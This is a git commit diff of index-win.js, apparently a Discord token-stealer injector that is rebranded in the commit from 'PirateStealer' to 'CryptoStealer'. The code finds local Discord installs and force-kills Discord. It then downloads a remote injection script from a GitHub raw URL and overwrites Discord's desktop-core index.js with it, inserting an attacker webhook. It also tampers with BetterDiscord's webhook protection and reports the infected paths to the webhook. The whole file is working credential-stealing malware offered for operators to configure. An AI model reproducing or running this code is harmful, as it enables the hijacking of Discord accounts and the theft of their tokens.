487b1f714bd20fdda7a583e5548a7875a0cad67e
murizada <72285063+sheikizin@users.noreply.github.com>
2022-05-06 20:38:00 -0300

    Update index-win.js

--- index-win.js
+++ index-win.js
@@ -1,30 +1,24 @@
+// Made by https://github.com/CryptoWare38/CryptoStealer
 
-// Code is shit
-var glob = require("glob");
+const glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
-
+const webhook = "yourWB"
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": %MBEDCOLOR%1,
-    "disable-qr-code": "%DISABLEQRCODE%1"
+    "logout": "instant",
+    "inject-notify": "true", // when you want to turn off do false
+    "logout-notify": "false", // when you want to turn on true
+    "init-notify": "false", // when you want to turn on true
+    "embed-color": 3447704, //your webhook color
+    "disable-qr-code": "true" // when you want to turn off do false
 }
-
-
-
-
-var LOCAL = process.env.LOCALAPPDATA
-var discords = [];
-var injectPath = [];
-var runningDiscords = [];
-
+let LOCAL = process.env.LOCALAPPDATA
+let discords = [];
+let injectPath = [];
+let runningDiscords = [];
 
 fs.readdirSync(LOCAL).forEach(file => {
     if (file.includes("iscord")) {
@@ -32,37 +26,39 @@ fs.readdirSync(LOCAL).forEach(file => {
     } else {
         return;
     }
-});
+}); // Made by https://github.com/CryptoWare38/CryptoStealer
 
 discords.forEach(function(file) {
     let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
     glob.sync(pattern).map(file => {
         injectPath.push(file)
     })
-    
 });
-listDiscords();
+
+listDiscords(); // Made by https://github.com/CryptoWare38/CryptoStealer 
+
 function Infect() {
-    https.get('https://raw.githubusercontent.com/sheikizin/teste/main/injetar.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/CryptoWare38/CryptoStealer/main/src/injection/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace(3447704,config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {  // Made by https://github.com/CryptoWare38/CryptoStealer
                     encoding: 'utf8',
                     flag: 'w'
                 });
+
                 if (config["init-notify"] == "true") {
                     let init = file.replace("index.js", "init")
                     if (!fs.existsSync(init)) {
                         fs.mkdirSync(init, 0744)
-                    }
+                    } // Made by https://github.com/CryptoWare38/CryptoStealer
                 }
-                if ( config.logout != "false" ) {
 
-                    let folder = file.replace("index.js", "PirateStealerBTW")
+                if ( config.logout != "false" ) {
+                    let folder = file.replace("index.js", "CryptoStealer")
                     if (!fs.existsSync(folder)) {
                         fs.mkdirSync(folder, 0744)
                         if (config.logout == "instant") {
@@ -73,34 +69,19 @@ function Infect() {
                     }
                 }
             })
-            
         });
     }).on("error", (err) => {
-        console.log(err);
+        console.log(err); // Made by https://github.com/CryptoWare38/CryptoStealer
     });
 };
 
-
 function listDiscords() {
-    exec('tasklist', function(err,stdout, stderr) {
+    exec('tasklist', function(err, stdout, stderr) {
+        if (stdout.includes("Discord.exe")) runningDiscords.push("discord");
+        if (stdout.includes("DiscordCanary.exe")) runningDiscords.push("discordcanary");
+        if (stdout.includes("DiscordDevelopment.exe")) runningDiscords.push("discorddevelopment");
+        if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("discordptb");
 
-        
-        if (stdout.includes("Discord.exe")) {
-
-            runningDiscords.push("discord")
-        }
-        if (stdout.includes("DiscordCanary.exe")) {
-
-            runningDiscords.push("discordcanary")
-        }
-        if (stdout.includes("DiscordDevelopment.exe")) {
-
-            runningDiscords.push("discorddevelopment")
-        }
-        if (stdout.includes("DiscordPTB.exe")) {
-
-            runningDiscords.push("discordptb")
-        };
         if (config.logout == "instant") {
             killDiscord();
         } else {
@@ -111,21 +92,19 @@ function listDiscords() {
             pwnBetterDiscord()
         }
     })
-
-
-   
-};
+}; // Made by https://github.com/CryptoWare38/CryptoStealer
 
 function killDiscord() {
     runningDiscords.forEach(disc => {
-        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
+        exec(`taskkill /IM ${disc}.exe /F`, (err) => { // Made by https://github.com/CryptoWare38/CryptoStealer
             if (err) {
               return;
             }
-          });
+        });
     });
+
     if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
-        injectNotify();
+        injectNotify(); // Made by https://github.com/CryptoWare38/CryptoStealer
     }
 
     Infect()
@@ -139,34 +118,31 @@ function startDiscord() {
             if (err) {
               return;
             }
-          });
+        });
     });
 };
+
 function pwnBetterDiscord() {
-    // thx stanley
-    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+    let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
-        var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
-    } else {
-        return;
+        let x = fs.readFileSync(dir)
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "gaysarecool"))
     }
 
-}
-
+    return;
+} // Made by https://github.com/CryptoWare38/CryptoStealer
 
 function injectNotify() {
-    var fields = [];
+    let fields = [];
     injectPath.forEach( path => {
-        var c = {
+        let c = { // Made by https://github.com/CryptoWare38/CryptoStealer
             name: ":syringe: Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
         fields.push(c)
     })
-    axios
-	.post(webhook, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -174,10 +150,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
-            },
+              "name": "CryptoStealer"
+            }, // Made by https://github.com/CryptoWare38/CryptoStealer
             "footer": {
-              "text": "PirateStealer"
+              "text": "CryptoStealer"
             }
           }
         ]
@@ -185,8 +161,7 @@ function injectNotify() {
 	.then(res => {
 	})
 	.catch(error => {
-
+ // Made by https://github.com/CryptoWare38/CryptoStealer
     })
-
 }
-
+ // Made by https://github.com/CryptoWare38/CryptoStealer
